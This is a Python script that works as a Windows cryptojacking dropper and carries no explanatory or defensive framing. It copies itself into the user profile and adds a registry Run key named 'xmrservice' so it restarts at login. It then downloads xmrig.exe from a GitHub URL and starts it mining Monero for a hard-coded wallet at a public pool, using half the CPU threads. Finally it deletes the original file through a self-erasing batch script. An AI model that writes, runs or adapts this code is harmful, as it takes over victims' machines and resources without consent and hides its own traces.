import os
import sys
import shutil
import subprocess
import winreg
import urllib.request
import random

# Function to copy the script to the user's profile directory
def copy_to_userprofile():
    userprofile = os.environ.get("USERPROFILE")
    if not userprofile:
        print("Cannot find USERPROFILE environment variable.")
        sys.exit(1)
    filename = os.path.basename(sys.argv[0])
    dest_path = os.path.join(userprofile, filename)
    try:
        # Copy only if the file does not already exist in the userprofile directory
        if not os.path.exists(dest_path):
            shutil.copy2(sys.argv[0], dest_path)
            print(f"Successfully copied to: {dest_path}")
    except Exception as e:
        print("Error copying file:", e)
        sys.exit(1)
    return dest_path

# Function to check if the registry entry already exists
def check_registry():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
        winreg.QueryValueEx(key, "xmrservice")
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print("Error checking registry:", e)
        return False

# Function to add the script to the registry for startup execution
def add_to_startup(file_path):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
    except FileNotFoundError:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
    try:
        winreg.SetValueEx(key, "xmrservice", 0, winreg.REG_SZ, file_path)
        print("Added to registry as 'xmrservice' to run on startup.")
    except Exception as e:
        print("Error adding to registry:", e)
    finally:
        winreg.CloseKey(key)

# Function to check and download xmrig.exe if it doesn't exist in the userprofile directory
def check_and_download_xmrig(userprofile):
    xmrig_path = os.path.join(userprofile, "xmrig.exe")
    if not os.path.exists(xmrig_path):
        url = "https://github.com/zvwgvx/xmrig/raw/refs/heads/main/xmrig.exe"
        try:
            urllib.request.urlretrieve(url, xmrig_path)
            print(f"Downloaded xmrig.exe to: {xmrig_path}")
        except Exception as e:
            print("Error downloading xmrig.exe:", e)
    else:
        print("xmrig.exe already exists in the userprofile directory.")

# Function to run xmrig.exe with the specified parameters
def run_xmrig(userprofile):
    xmrig_path = os.path.join(userprofile, "xmrig.exe")
    if not os.path.exists(xmrig_path):
        print("xmrig.exe not found in userprofile, cannot run.")
        return
    # Determine the number of threads as floor(cpu_count / 2)
    cpu_count = os.cpu_count() or 1
    threads = cpu_count // 2 if cpu_count > 1 else 1
    # Construct the unique name using the computer name and a random 6-digit number
    computer_name = os.environ.get("COMPUTERNAME", "unknown")
    random_number = f"{random.randint(0, 999999):06d}"
    unique_name = f"{computer_name}_{random_number}"
    # Build the command with replaced parameters
    cmd = [
        xmrig_path,
        "-k",
        "-a", "rx",
        "-t", str(threads),
        "-o", "gulf.moneroocean.stream:10128",
        "--asm=intel",
        "--randomx-mode=fast",
        "-k",
        "-u", f"47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP.{unique_name}",
        "--donate-level", "0"
    ]
    try:
        subprocess.Popen(cmd, shell=False)
        print("xmrig.exe has been started with the specified parameters.")
    except Exception as e:
        print("Error starting xmrig.exe:", e)

# Function to create a batch file that deletes the original script and then itself
def self_delete():
    current_file = os.path.abspath(sys.argv[0])
    bat_path = os.path.join(os.environ["TEMP"], "delete.bat")
    bat_content = (
        f"@echo off\r\n"
        f"ping 127.0.0.1 -n 5 > nul\r\n"
        f"del \"{current_file}\"\r\n"
        f"del \"%~f0\""
    )
    try:
        with open(bat_path, "w") as bat_file:
            bat_file.write(bat_content)
        subprocess.Popen(["cmd", "/c", bat_path], shell=False)
        print("Deleting the original script.")
    except Exception as e:
        print("Error deleting file:", e)

# Main execution block
if __name__ == "__main__":
    userprofile = os.environ.get("USERPROFILE")
    if not userprofile:
        print("Cannot find USERPROFILE environment variable.")
        sys.exit(1)
    
    current_dir = os.path.abspath(os.path.dirname(sys.argv[0]))
    # Check if the script is running from %USERPROFILE%
    if current_dir.lower() != userprofile.lower():
        # If not running from userprofile, copy the script there and run from the copy
        dest_file = copy_to_userprofile()
        if not check_registry():
            add_to_startup(dest_file)
        else:
            print("Registry entry 'xmrservice' already exists.")
        check_and_download_xmrig(userprofile)
        run_xmrig(userprofile)
        self_delete()
        sys.exit()
    else:
        # Already running from %USERPROFILE%, so just run normally without copying or self-deleting
        if not check_registry():
            add_to_startup(sys.argv[0])
        else:
            print("Registry entry 'xmrservice' already exists.")
        check_and_download_xmrig(userprofile)
        run_xmrig(userprofile)
        sys.exit()
